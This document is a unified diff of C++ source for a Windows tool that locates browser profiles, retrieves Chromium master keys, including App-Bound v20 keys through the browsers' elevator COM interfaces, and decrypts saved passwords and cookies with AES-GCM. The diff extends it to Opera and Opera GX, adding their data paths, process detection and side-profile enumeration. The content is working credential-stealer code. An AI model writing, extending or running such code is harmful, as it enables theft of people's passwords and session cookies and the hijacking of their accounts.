@@ -17,16 +17,13 @@ using json = nlohmann::json;
 namespace fs = std::filesystem;
 
 void log_to_file(const std::string& msg) {
-    char* user_profile = nullptr;
-    size_t len = 0;
-    _dupenv_s(&user_profile, &len, "USERPROFILE");
+    char* user_profile = getenv("USERPROFILE");
     if (user_profile) {
         fs::path log_path = fs::path(user_profile) / "Desktop" / "extractor_log.txt";
         std::ofstream log_file(log_path, std::ios::app);
         if (log_file) {
             log_file << "[" << GetTickCount() << "] " << msg << std::endl;
         }
-        free(user_profile);
     }
 }
 
@@ -53,7 +50,7 @@ std::string ensure_utf8(const std::string& input) {
     return output;
 }
 
-enum class Browser { Chrome, Edge, Brave };
+enum class Browser { Chrome, Edge, Brave, Opera, OperaGX };
 
 struct PasswordData { std::string url, username, password; };
 struct CookieData {
@@ -121,7 +118,8 @@ std::vector<unsigned char> decrypt_with_elevator(const std::vector<unsigned char
     std::vector<GUID> iids;
     if (browser == Browser::Chrome) { clsid = CLSID_CHROME_ELEVATOR; iids = { IID_CHROME_IELEVATOR2, IID_CHROME_IELEVATOR1 }; }
     else if (browser == Browser::Edge) { clsid = CLSID_EDGE_ELEVATOR; iids = { IID_EDGE_IELEVATOR2, IID_EDGE_IELEVATOR1 }; }
-    else { clsid = CLSID_BRAVE_ELEVATOR; iids = { IID_BRAVE_IELEVATOR2, IID_BRAVE_IELEVATOR1 }; }
+    else if (browser == Browser::Brave) { clsid = CLSID_BRAVE_ELEVATOR; iids = { IID_BRAVE_IELEVATOR2, IID_BRAVE_IELEVATOR1 }; }
+    else return {}; // Opera currently doesn't use (or CLSID unknown) App-Bound for master key in this context
 
     HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
     if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) return {};
@@ -273,6 +271,8 @@ Browser get_browser() {
     std::transform(s.begin(), s.end(), s.begin(), ::towlower);
     if (s.find(L"msedge.exe") != std::wstring::npos) return Browser::Edge;
     if (s.find(L"brave.exe") != std::wstring::npos) return Browser::Brave;
+    if (s.find(L"opera gx") != std::wstring::npos) return Browser::OperaGX;
+    if (s.find(L"opera") != std::wstring::npos) return Browser::Opera;
     return Browser::Chrome;
 }
 
@@ -282,20 +282,22 @@ void do_work() {
         Browser browser = get_browser();
         log_to_file("Browser detected: " + std::to_string((int)browser));
 
-        char* user_profile_env = nullptr;
-        size_t len = 0;
-        _dupenv_s(&user_profile_env, &len, "USERPROFILE");
+        char* user_profile_env = getenv("USERPROFILE");
         if (!user_profile_env) {
             log_to_file("Error: USERPROFILE env var not found.");
             return;
         }
         fs::path user_profile(user_profile_env);
-        free(user_profile_env);
 
         fs::path data_path;
+        char* appdata_roaming_env = getenv("APPDATA");
+        fs::path appdata_roaming = appdata_roaming_env ? fs::path(appdata_roaming_env) : (user_profile / "AppData/Roaming");
+
         if (browser == Browser::Chrome) data_path = user_profile / "AppData/Local/Google/Chrome/User Data";
         else if (browser == Browser::Edge) data_path = user_profile / "AppData/Local/Microsoft/Edge/User Data";
-        else data_path = user_profile / "AppData/Local/BraveSoftware/Brave-Browser/User Data";
+        else if (browser == Browser::Brave) data_path = user_profile / "AppData/Local/BraveSoftware/Brave-Browser/User Data";
+        else if (browser == Browser::Opera) data_path = appdata_roaming / "Opera Software/Opera Stable";
+        else if (browser == Browser::OperaGX) data_path = appdata_roaming / "Opera Software/Opera GX Stable";
 
         log_to_file("Data path: " + data_path.string());
 
@@ -329,9 +331,25 @@ void do_work() {
         log_to_file("v20 key retrieval: " + std::string(v20_key.empty() ? "FAILED" : "SUCCESS"));
     }
 
-    std::vector<std::string> profiles = { "Default" };
-    for (const auto& entry : fs::directory_iterator(data_path)) {
-        if (entry.is_directory() && entry.path().filename().string().find("Profile ") == 0) profiles.push_back(entry.path().filename().string());
+    std::vector<std::string> profiles;
+    if (browser == Browser::Opera || browser == Browser::OperaGX) {
+        // Opera often stores data in the root or a Default folder, or side profiles
+        profiles.push_back("."); // Root as a profile
+        if (fs::exists(data_path / "Default")) profiles.push_back("Default");
+
+        fs::path side_path = data_path / "_side_profiles";
+        if (fs::exists(side_path)) {
+            for (const auto& entry : fs::directory_iterator(side_path)) {
+                if (entry.is_directory()) {
+                    profiles.push_back("_side_profiles/" + entry.path().filename().string());
+                }
+            }
+        }
+    } else {
+        profiles.push_back("Default");
+        for (const auto& entry : fs::directory_iterator(data_path)) {
+            if (entry.is_directory() && entry.path().filename().string().find("Profile ") == 0) profiles.push_back(entry.path().filename().string());
+        }
     }
 
     json collected = json::array();
@@ -366,6 +384,7 @@ void do_work() {
 
                             bool is_v20 = (enc_pass.size() > 3 && std::string((char*)enc_pass.data(), 3) == "v20");
                             auto& key = is_v20 ? v20_key : v10_key;
+
                             if (!key.empty()) {
                                 auto dec = aes_gcm_decrypt(key, enc_pass);
                                 if (!dec.empty()) {
@@ -411,6 +430,7 @@ void do_work() {
 
                             bool is_v20 = (enc_val.size() > 3 && std::string((char*)enc_val.data(), 3) == "v20");
                             auto& key = is_v20 ? v20_key : v10_key;
+
                             if (!key.empty()) {
                                 auto dec = aes_gcm_decrypt(key, enc_val);
                                 if (!dec.empty()) {
